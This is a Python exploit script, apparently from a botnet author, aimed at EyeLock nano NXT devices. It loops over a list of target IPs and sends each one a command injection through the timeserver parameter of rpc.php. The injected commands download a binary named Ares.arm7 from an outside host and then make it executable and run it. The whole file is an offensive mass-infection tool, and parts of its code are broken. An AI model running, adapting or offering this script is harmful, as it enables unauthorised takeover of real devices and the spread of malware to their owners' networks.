#!/usr/bin/env python
# -*- coding: utf-8 -*- 
# EyeLock nano NXT Exploit made by B4CKDOOR  #
# B4CKDOORARCHIVE.HOST - yolo #

import threading, random, socket, time, sys, requests, re, os, subprocess

if len(sys.argv) < 3:
	print "\033[37mUsage: python "+sys.argv[0]+" <list> <port>\033[37m"
	sys.exit()

ip = "1.3.3.7" # BINS LOCATION IP
vulns = open(sys.argv[1], "r").readlines()
port = int(sys.argv[2]) # PORTS 80
class send_payload(threading.Thread):
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		try:
			url = "http://" + self.ip + ":"+port+"/scripts/rpc.php?action=updatetime&timeserver=||cd /tmp; wget http://" + ip + "/Ares.arm7; curl -O http://" + ip + "/Ares.arm7; chmod +x Ares.arm7; ./Ares.arm7"
			requests.get(url, timeout=8)
			print "[NXT] Loading: %s"%(self.ip)
		except:
			pass

for IP in vulns:
	try:
		ip = "".join(IP)
		ip = ip.replace("\n", "")
		t = send_payload(ip)
		t.start()
		time.sleep(0.03)
	except:
		pass #CODED BY B4CKDOOR